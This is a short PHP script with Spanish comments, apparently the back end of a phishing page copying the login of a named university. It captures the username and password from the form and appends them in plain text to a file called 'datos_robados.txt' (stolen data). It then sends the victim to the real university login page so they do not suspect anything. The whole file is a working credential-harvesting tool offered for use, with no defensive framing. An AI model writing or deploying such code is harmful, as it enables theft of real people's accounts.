<?php
// 1. Recibimos los datos del formulario
$usuario = $_POST['username']; // El nombre debe coincidir con el 'name' del input
$password = $_POST['password'];

// 2. Formateamos el texto que vamos a guardar
$texto = "Usuario: " . $usuario . " | Password: " . $password . "\n";

// 3. Lo guardamos en un archivo llamado 'datos_robados.txt'
// FILE_APPEND sirve para que no se borre lo anterior si alguien más entra
file_put_contents('datos_robados.txt', $texto, FILE_APPEND);

// 4. Redirigimos al usuario a la página REAL de la UNI para que no sospeche
header('Location: https://pit-virtual.uni.edu.pe/login/');
exit();
?>